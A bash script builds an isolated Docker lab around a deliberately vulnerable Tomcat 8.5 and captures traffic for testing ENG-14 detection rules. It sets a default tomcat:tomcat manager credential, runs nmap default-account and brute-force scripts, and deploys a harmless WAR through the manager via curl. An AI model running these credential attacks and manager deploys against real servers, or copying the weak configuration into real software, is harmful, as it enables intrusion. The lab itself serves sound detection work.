#!/bin/bash
# Out-of-sample test data for ENG-14: REAL attack tools (nmap NSE scripts, curl) against a REAL Tomcat with a default manager
# credential, inside a throwaway Docker network with NO route to your LAN or the internet (--internal). Traffic is recorded with
# tcpdump in the target's network namespace. Nothing here is synthetic and none of these tools were used to write the ENG-14 rules
# (which were derived from Metasploit captures).
#
#   bash scripts/lab/tomcat_lab.sh [outdir]      needs: docker; images tomcat:8.5-jre8, instrumentisto/nmap, nicolaka/netshoot
#   cleanup is automatic (containers + network); images are left in place.
set -euo pipefail
export MSYS_NO_PATHCONV=1
OUT="${1:-data/lab_eng14}"; mkdir -p "$OUT"; OUTW="$(cd "$OUT" && pwd -W 2>/dev/null || pwd)"
LAB="$(cd "$(dirname "$0")" && pwd)"; LABW="$(cd "$LAB" && pwd -W 2>/dev/null || pwd)"
NET=stealthtap-lab
cleanup() { docker rm -f lab-tomcat lab-sniff >/dev/null 2>&1 || true; docker network rm $NET >/dev/null 2>&1 || true; }
trap cleanup EXIT; cleanup
docker network create --internal $NET >/dev/null

# target: Tomcat 8.5 with the manager app enabled for any address, a default credential (tomcat:tomcat) and one strong operator account
cat > "$LAB/tomcat-users.xml" <<'XML'
<tomcat-users>
  <role rolename="manager-gui"/><role rolename="manager-script"/>
  <user username="tomcat" password="tomcat" roles="manager-gui,manager-script"/>
  <user username="ops" password="Zq7-hb4Wm-91xTe-Lp2" roles="manager-gui"/>
</tomcat-users>
XML
echo '<Context antiResourceLocking="false" privileged="true"/>' > "$LAB/manager-context.xml"
printf "admin
tomcat
root
manager
ops
" > "$LAB/users.lst"; printf "admin
password
123456
changeme
tomcat
secret
s3cret
letmein
qwerty
Manager1
" > "$LAB/pass.lst"
docker run -d --name lab-tomcat --network $NET -v "$LABW:/lab:ro" tomcat:8.5-jre8 sh -c \
  'cp -r /usr/local/tomcat/webapps.dist/* /usr/local/tomcat/webapps/ && cp /lab/manager-context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml && cp /lab/tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml && exec catalina.sh run' >/dev/null
for i in $(seq 1 60); do docker run --rm --network $NET nicolaka/netshoot curl -s -o /dev/null -m 3 http://lab-tomcat:8080/ && break; sleep 2; done

sniff() {   # sniff <name>  -> starts tcpdump in the target's namespace; returns after it is listening
  docker run -d --name lab-sniff --network container:lab-tomcat --cap-add NET_RAW --cap-add NET_ADMIN -v "$OUTW:/cap" nicolaka/netshoot \
    tcpdump -i eth0 -U -s 0 -w "/cap/$1.pcap" tcp port 8080 >/dev/null; sleep 3
}
unsniff() { sleep 2; docker stop lab-sniff >/dev/null; docker rm lab-sniff >/dev/null; }
client() { docker run --rm --network $NET "$@"; }

echo "== benign control: browsing, a mistyped password, an operator using a strong credential"
sniff benign
client nicolaka/netshoot sh -c '
  curl -s -o /dev/null http://lab-tomcat:8080/
  curl -s -o /dev/null http://lab-tomcat:8080/docs/
  curl -s -o /dev/null -u ops:wrong-typo http://lab-tomcat:8080/manager/html
  for p in /manager/html /manager/html/list /manager/status /manager/html; do curl -s -o /dev/null -u "ops:Zq7-hb4Wm-91xTe-Lp2" http://lab-tomcat:8080$p; done'
unsniff

echo "== attack 1: nmap http-default-accounts (real NSE script, tries vendor default logins)"
sniff attack_nmap_default_accounts
client instrumentisto/nmap -Pn -p 8080 --script http-default-accounts lab-tomcat | sed -n "1,14p"
unsniff

echo "== attack 2: nmap http-brute against the manager (real NSE credential guessing)"
sniff attack_nmap_http_brute
docker run --rm --network $NET -v "$LABW:/lab:ro" instrumentisto/nmap -Pn -sV -p 8080 --script http-brute --script-args 'http-brute.path=/manager/html,brute.firstonly=true,userdb=/lab/users.lst,passdb=/lab/pass.lst' -d1 lab-tomcat | grep -iE 'http-brute|NSE:|brute|Valid|Account' | sed -n '1,25p'
unsniff

echo "== attack 3: code deployment through the manager text interface (curl PUT of a WAR with the default credential)"
python3 - "$LABW" <<'PY' 2>/dev/null || python - "$LABW" <<'PY2'
import sys, zipfile
z = zipfile.ZipFile(sys.argv[1] + "/lab.war", "w")
z.writestr("index.jsp", "<%= 1+1 %>")
z.writestr("WEB-INF/web.xml", '<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0"/>')
z.close()
PY
import sys, zipfile
z = zipfile.ZipFile(sys.argv[1] + "/lab.war", "w")
z.writestr("index.jsp", "<%= 1+1 %>")
z.writestr("WEB-INF/web.xml", '<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0"/>')
z.close()
PY2
sniff attack_curl_war_deploy
docker run --rm --network $NET -v "$LABW:/lab:ro" nicolaka/netshoot curl -s -u tomcat:tomcat -T /lab/lab.war "http://lab-tomcat:8080/manager/text/deploy?path=/labapp&update=true" >/dev/null
unsniff
rm -f "$LAB/users.lst" "$LAB/pass.lst" "$LAB/lab.war" "$LAB/tomcat-users.xml" "$LAB/manager-context.xml"
ls -la "$OUT"/*.pcap
